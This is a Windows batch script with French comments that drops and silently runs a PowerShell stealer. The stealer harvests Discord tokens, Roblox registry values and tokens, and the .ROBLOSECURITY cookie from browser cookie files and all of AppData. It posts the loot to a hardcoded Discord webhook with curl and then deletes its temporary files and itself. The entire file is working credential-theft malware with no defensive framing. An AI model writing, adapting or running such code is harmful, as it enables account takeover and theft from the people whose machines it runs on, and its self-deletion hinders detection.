@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION AVEC DIAGNOSTIC (SILENCIEUX)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL (AVEC LOGS)
set "psfile=%TEMP%\extract_diag.ps1"
set "outfile=%TEMP%\result_diag.txt"
(
echo # -----------------------------------------------------------------
echo # SCRIPT D'EXTRACTION AVEC DIAGNOSTIC - TOUS LES EMPLACEMENTS
echo # -----------------------------------------------------------------
echo $log = @()
echo $log += "=== DEBUT DE L'EXTRACTION ==="
echo $log += "Heure : $(Get-Date)"
echo $log += "Utilisateur : $env:USERNAME"
echo $log += ""
echo.
echo # --- 1. TOKENS DISCORD ---
echo $log += "--- RECHERCHE DES TOKENS DISCORD ---"
echo $discordPaths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $patternDiscord = '[a-zA-Z0-9_\-]{20,80}\.[a-zA-Z0-9_\-]{6,30}\.[a-zA-Z0-9_\-]{20,100}'
echo foreach ($p in $discordPaths) {
echo     $log += "Recherche dans : $p"
echo     if (Test-Path $p) {
echo         $log += "  Le dossier existe."
echo         Get-ChildItem $p -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             $matches = Select-String -Path $_.FullName -Pattern $patternDiscord -AllMatches -ErrorAction SilentlyContinue
echo             if ($matches) {
echo                 $log += "    Trouve dans : $($_.Name)"
echo                 $matches ^| ForEach-Object { $_.Matches.Value } ^| ForEach-Object { $tokens += $_ }
echo             }
echo         }
echo     } else {
echo         $log += "  Dossier inexistant."
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discordTokens = $tokens -join ' '
echo $log += "Tokens Discord trouves : $($tokens.Count)"
echo $log += ""
echo.
echo # --- 2. ROBLOX : REGISTRE (STUDIO ET PLAYER) ---
echo $log += "--- RECHERCHE ROBLOX DANS LE REGISTRE ---"
echo $robloxUser = $null
echo $robloxRemember = $null
echo $regKeys = @("HKCU:\Software\Roblox\RobloxStudio", "HKCU:\Software\Roblox\Roblox")
echo foreach ($key in $regKeys) {
echo     $log += "Recherche dans la clé : $key"
echo     try {
echo         $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
echo         if ($props -ne $null) {
echo             $log += "  Clé trouvee."
echo             if ($props.UserID -ne $null -and $robloxUser -eq $null) {
echo                 $robloxUser = $props.UserID
echo                 $log += "  UserID = $robloxUser"
echo             }
echo             if ($props.RememberMe -ne $null -and $robloxRemember -eq $null) {
echo                 $robloxRemember = $props.RememberMe
echo                 $log += "  RememberMe = $robloxRemember"
echo             }
echo             # Recherche d'un token dans les valeurs
echo             $props.PSObject.Properties ^| ForEach-Object {
echo                 if ($_.Name -match 'token|auth|session' -and $_.Value -match '[a-zA-Z0-9_\-]{30,}') {
echo                     if ($robloxTokenReg -eq $null) { $robloxTokenReg = $_.Value; $log += "  Token trouve dans registre : $robloxTokenReg" }
echo                 }
echo             }
echo         } else {
echo             $log += "  Clé non trouvee."
echo         }
echo     } catch {
echo         $log += "  Erreur : $_"
echo     }
echo }
echo $log += ""
echo.
echo # --- 3. ROBLOX : FICHIER XML GLOBAL ---
echo $log += "--- RECHERCHE ROBLOX DANS LE FICHIER XML ---"
echo $robloxXmlToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo $log += "Chemin : $xmlPath"
echo if (Test-Path $xmlPath) {
echo     $log += "Fichier existe."
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) {
echo             $robloxXmlToken = $xml.settings.token
echo             $log += "Token trouve dans XML : $robloxXmlToken"
echo         } else {
echo             $log += "Pas de token dans le XML."
echo         }
echo     } catch {
echo         $log += "Erreur lecture XML : $_"
echo     }
echo } else {
echo     $log += "Fichier introuvable."
echo }
echo $log += ""
echo.
echo # --- 4. ROBLOX : RECHERCHE DANS LES FICHIERS DU DOSSIER ROBLOX ---
echo $log += "--- RECHERCHE DANS LES FICHIERS ROBLOX (recherche de chaines longues) ---"
echo $robloxFileToken = $null
echo $robloxDirs = @("$env:LOCALAPPDATA\Roblox", "$env:APPDATA\Roblox")
echo $patternToken = '[a-zA-Z0-9_\-]{30,80}'
echo foreach ($dir in $robloxDirs) {
echo     $log += "Recherche dans : $dir"
echo     if (Test-Path $dir) {
echo         $log += "  Dossier existe."
echo         Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             # Ne pas parcourir les gros fichiers (plus de 5 Mo)
echo             if ($_.Length -lt 5MB) {
echo                 $matches = Select-String -Path $_.FullName -Pattern $patternToken -AllMatches -ErrorAction SilentlyContinue
echo                 if ($matches) {
echo                     $log += "    Trouve dans : $($_.Name)"
echo                     $matches ^| ForEach-Object { $_.Matches.Value } ^| ForEach-Object {
echo                         if ($_.Length -gt 30 -and $_ -match '^[a-zA-Z0-9_\-]+$' -and $robloxFileToken -eq $null) {
echo                             $robloxFileToken = $_
echo                             $log += "    Token potentiel : $robloxFileToken"
echo                         }
echo                     }
echo                 }
echo             }
echo         }
echo     } else {
echo         $log += "  Dossier inexistant."
echo     }
echo }
echo $log += ""
echo.
echo # --- 5. ROBLOX : COOKIE .ROBLOSECURITY (recherche brute dans les fichiers) ---
echo $log += "--- RECHERCHE DU COOKIE .ROBLOSECURITY ---"
echo $robloxCookie = $null
echo # Recherche dans les fichiers de cookies des navigateurs (lecture brute)
echo $cookieFiles = @()
echo # Chrome/Edge
echo $cookieFiles += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
echo $cookieFiles += "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
echo # Firefox (fichiers SQLite)
echo $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
echo foreach ($prof in $firefoxProfiles) {
echo     $cookieFiles += "$($prof.FullName)\cookies.sqlite"
echo }
echo # Fichiers texte legacy
echo $cookieFiles += "$env:APPDATA\Microsoft\Windows\Cookies\*.txt"
echo $cookieFiles += "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies\*.txt"
echo $log += "Fichiers de cookies à inspecter :"
echo $cookieFiles ^| ForEach-Object { $log += "  $_" }
echo foreach ($file in $cookieFiles) {
echo     if (Test-Path $file) {
echo         $log += "Inspection : $file"
echo         # On cherche la chaîne "ROBLOSECURITY=" suivie de caractères
echo         $matches = Select-String -Path $file -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue
echo         if ($matches) {
echo             $log += "  Trouve !"
echo             $matches ^| ForEach-Object { $_.Matches.Value } ^| ForEach-Object {
echo                 $val = $_ -replace 'ROBLOSECURITY=',''
echo                 if ($val.Length -gt 30) {
echo                     $robloxCookie = $val
echo                     $log += "  Cookie : $robloxCookie"
echo                 }
echo             }
echo             if ($robloxCookie) { break }
echo         } else {
echo             $log += "  Aucun cookie trouve dans ce fichier."
echo         }
echo     } else {
echo         $log += "Fichier introuvable : $file"
echo     }
echo }
echo # Fallback : chercher dans tous les fichiers sous AppData
echo if (-not $robloxCookie) {
echo     $log += "Recherche de .ROBLOSECURITY dans tous les fichiers AppData (limite 100 Mo)..."
echo     $searchDirs = @("$env:APPDATA", "$env:LOCALAPPDATA")
echo     foreach ($dir in $searchDirs) {
echo         Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue ^| Where-Object { $_.Length -lt 10MB } ^| ForEach-Object {
echo             $matches = Select-String -Path $_.FullName -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue
echo             if ($matches) {
echo                 $log += "  Trouve dans : $($_.FullName)"
echo                 $matches ^| ForEach-Object { $_.Matches.Value } ^| ForEach-Object {
echo                     $val = $_ -replace 'ROBLOSECURITY=',''
echo                     if ($val.Length -gt 30) {
echo                         $robloxCookie = $val
echo                         $log += "  Cookie : $robloxCookie"
echo                     }
echo                 }
echo                 if ($robloxCookie) { break }
echo             }
echo         }
echo         if ($robloxCookie) { break }
echo     }
echo }
echo $log += ""
echo.
echo # --- 6. CONSTRUCTION DU MESSAGE FINAL ---
echo $log += "--- CONSTRUCTION DU MESSAGE ---"
echo $msg = ""
echo if ($discordTokens -ne "") { $msg += "=== TOKENS DISCORD ===`n$discordTokens`n`n" }
echo if ($robloxUser -ne $null -and $robloxUser -ne "") { $msg += "=== ROBLOX UserID ===`n$robloxUser`n`n" }
echo if ($robloxRemember -ne $null -and $robloxRemember -ne "") { $msg += "=== ROBLOX RememberMe ===`n$robloxRemember`n`n" }
echo if ($robloxXmlToken -ne $null -and $robloxXmlToken -ne "") { $msg += "=== ROBLOX Token (XML) ===`n$robloxXmlToken`n`n" }
echo if ($robloxFileToken -ne $null -and $robloxFileToken -ne "") { $msg += "=== ROBLOX Token (fichier) ===`n$robloxFileToken`n`n" }
echo if ($robloxCookie -ne $null -and $robloxCookie -ne "") { $msg += "=== ROBLOX Cookie (.ROBLOSECURITY) ===`n$robloxCookie`n`n" }
echo if ($msg -eq "") {
echo     $msg = "Aucune donnee collectee.`n"
echo     $msg += "=== DIAGNOSTIC ===`n"
echo     $msg += ($log -join "`n")
echo } else {
echo     $msg += "=== DIAGNOSTIC (succes) ===`n"
echo     $msg += ($log -join "`n")
echo }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTION DU POWERSHELL (SILENCIEUX)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LECTURE DU RESULTAT
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : SI MSG VIDE, FORCER UN MESSAGE D'ERREUR
if "!msg!"=="" set "msg=Erreur : aucun resultat genere.\n"

:: ETAPE 5 : ECHAPPEMENT JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
